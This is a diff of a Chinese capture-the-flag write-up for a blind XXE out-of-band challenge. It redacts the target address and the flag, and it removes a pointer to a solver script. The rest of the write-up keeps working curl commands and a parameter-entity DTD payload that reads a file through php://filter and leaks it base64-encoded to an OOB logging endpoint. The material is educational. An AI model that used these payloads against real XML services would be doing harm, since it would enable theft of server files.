@@ -28,9 +28,9 @@ OOB 日志：GET /oob-log
 ### 1. 三探针确认环境
 
 ```bash
-curl 'http://47.120.76.57:34936/oob?c=hello'
-curl 'http://47.120.76.57:34936/oob-log'
-curl -X POST --data '<!ENTITY x "hi">' 'http://47.120.76.57:34936/dtd-upload'
+curl 'http://目标地址/oob?c=hello'
+curl 'http://目标地址/oob-log'
+curl -X POST --data '<!ENTITY x "hi">' 'http://目标地址/dtd-upload'
 ```
 
 三条都正常（最后一条返回 `{"ok":true,"url":"http://127.0.0.1/dtd/xxx.dtd"}`）即可开打。
@@ -49,7 +49,7 @@ curl -X POST --data '<!ENTITY x "hi">' 'http://47.120.76.57:34936/dtd-upload'
 命令行复现：
 
 ```bash
-curl -X POST 'http://47.120.76.57:34936/dtd-upload' \
+curl -X POST 'http://目标地址/dtd-upload' \
   -H 'Content-Type: text/plain' \
   --data-binary $'<!ENTITY % f SYSTEM "php://filter/convert.base64-encode/resource=/flag">\n<!ENTITY % ex "<!ENTITY &#x25; out SYSTEM \'http://127.0.0.1/oob?c=%f;\'>">\n%ex;\n%out;\n'
 ```
@@ -65,7 +65,7 @@ http://127.0.0.1/dtd/91d6122855cc.dtd
 把上一步的 DTD URL 填进去：
 
 ```bash
-curl -X POST 'http://47.120.76.57:34936/submit' \
+curl -X POST 'http://目标地址/submit' \
   -H 'Content-Type: application/xml' \
   --data-binary '<?xml version="1.0"?>
 <!DOCTYPE r [<!ENTITY % dtd SYSTEM "http://127.0.0.1/dtd/91d6122855cc.dtd"> %dtd;]>
@@ -77,7 +77,7 @@ curl -X POST 'http://47.120.76.57:34936/submit' \
 ### 4. 查看 OOB 日志并解码
 
 ```bash
-curl 'http://47.120.76.57:34936/oob-log'
+curl 'http://目标地址/oob-log'
 ```
 
 看到一行：
@@ -95,7 +95,7 @@ echo 'VE9HT0dPLWZsYWd7MjAwMzA0MjAtNzk1Mi00NWY1LTgyNGQtZmRlOGI3NjYwZTI2fQ==' | ba
 即可拿到 flag：
 
 ```text
-TOGOGO-flag{20030420-7952-45f5-824d-fde8b7660e26}
+TOGOGO-flag{}
 ```
 
 ## 为什么必须用外部 DTD
@@ -117,12 +117,3 @@ PEReferences forbidden in internal subset
 ## 为什么用 `php://filter` base64
 
 flag 含 `{}-`，直接进 URL query 容易被特殊字符破坏。`php://filter/convert.base64-encode/resource=/flag` 把内容编成只有 `A-Za-z0-9+/=` 的 base64，进 URL 最安全。
-
-## 一键脚本
-
-见同目录 `main.py`：
-
-```bash
-source /Users/zlux/Project/Active/gkdctf/.venv/bin/activate
-python /Users/zlux/Project/Active/gkdctf/28-xxe-blind-oob/main.py
-```
